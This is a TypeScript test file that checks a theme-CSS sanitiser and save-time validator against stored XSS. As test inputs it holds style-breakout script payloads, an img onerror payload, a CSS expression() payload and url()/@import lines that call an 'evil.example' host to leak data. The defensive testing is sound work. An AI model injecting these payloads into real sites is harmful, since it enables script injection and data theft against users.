/**
 * Run: npx -y tsx@4.23.15 src/lib/theme-css.assert.ts
 */
import assert from 'node:assert/strict'
import { neutraliseThemeCss, themeCssProblem, THEME_CSS_MAX } from './theme-css'

let n = 0
const check = (name: string, fn: () => void) => { fn(); n++; console.log(`ok ${n} - ${name}`) }

const SEEDED = `@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
:root {
  --font-sans: 'Poppins', sans-serif;
  --primary: oklch(0.29 0.05 235);
  --radius: 0.75rem;
}
.dark {
  --primary: oklch(0.85 0.1 235);
}`

check('render: stored theme CSS can never close <style> (H-2)', () => {
  const attack = '</style><script>alert(1)</script><style>'
  const out = neutraliseThemeCss(attack)
  assert.ok(!/<\/style/i.test(out), out)
  assert.ok(!out.includes('<'), out)
  assert.equal(neutraliseThemeCss('</STYLE ><img src=x onerror=alert(1)>'), ' >\\3c img src=x onerror=alert(1)>')
  // What the importer writes is unchanged.
  assert.equal(neutraliseThemeCss(SEEDED), SEEDED)
  assert.equal(neutraliseThemeCss(undefined), '')
})

check('save: only CSS variables and Google Fonts imports are accepted (H-2)', () => {
  assert.equal(themeCssProblem(SEEDED), null)
  assert.equal(themeCssProblem(undefined), null)
  assert.equal(themeCssProblem(''), null)
  assert.match(themeCssProblem('</style><script>alert(1)</script>')!, /“<”/)
  assert.match(themeCssProblem(':root{--x: url(https://evil.example/leak?c=1)}')!, /Google Fonts/)
  assert.match(themeCssProblem("@import url('https://evil.example/x.css');")!, /Google Fonts/)
  assert.match(themeCssProblem(':root{background: expression(alert(1))}')!, /colors, fonts/)
  assert.match(themeCssProblem(':root{--x: \\3c /style\\3e }')!, /colors, fonts/)
  assert.match(themeCssProblem({ evil: true })!, /text/)
  assert.match(themeCssProblem('a'.repeat(THEME_CSS_MAX + 1))!, /too long/)
})

console.log(`\n${n} checks passed`)
